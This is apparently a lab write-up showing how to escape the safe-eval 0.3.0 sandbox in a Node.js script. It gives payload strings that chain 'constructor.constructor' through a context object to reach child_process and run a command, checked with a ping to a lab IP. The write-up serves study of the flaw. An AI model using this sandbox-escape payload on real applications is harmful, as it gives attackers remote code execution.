# Extra Mile

In the extra mile, there are some small differences in the batch.js file. The main difference is that in the modified version, instead of using the `eval` function, the script instead imports the library `safe-eval` and uses it instead. The `safe-eval` library allows developers to execute JS code without having to use the discouraged eval function. However, prior to the version 3.0.0, the library is still vulnerable to sandbox breakout.

Looking inside the `package.json` file within the `node_modules` directory, we find that the version of safe eval is 0.3.0. As such, it is vulnerable to breakout.

Unlike the normal eval function, safe-eval prohibits the functionality of keywords like require. Safe-eval has access to all the standard APIs of the V8 JavaScript Engine, but by default, it does not have access to NodeJS API and needs to be given access using a **context object.** As such, when we try to use a common payload, we get the error message that the function `child_process` is unavailable. Source: https://github.com/hacksparrow/safe-eval

```json
code = "this.constructor.constructor('return child_process')().exec('ping -c 4 192.168.45.234')"
context = {parts: {}}
safeEval(code,context)
```

However, while the default `this`variable lacks access to the standard APIs, this restriction does not hold true for the **context** variable. As such, if we capitalize on one of the attributes in the context variable (i.e. parts), we will be able to access the NodeJS APIs and hence the `child_process` functionality. As such, we will gain RCE and receive a response on our local TCPdump. 

```json
code = "parts.constructor.constructor('return child_process')().exec('ping -c 4 192.168.45.234')"
context = {parts: {}}
safeEval(code,context)
```

When we run the entire shellcode, we find that the objects don’t have the child_process attribute and thus we use the process attribute as an intermediary.
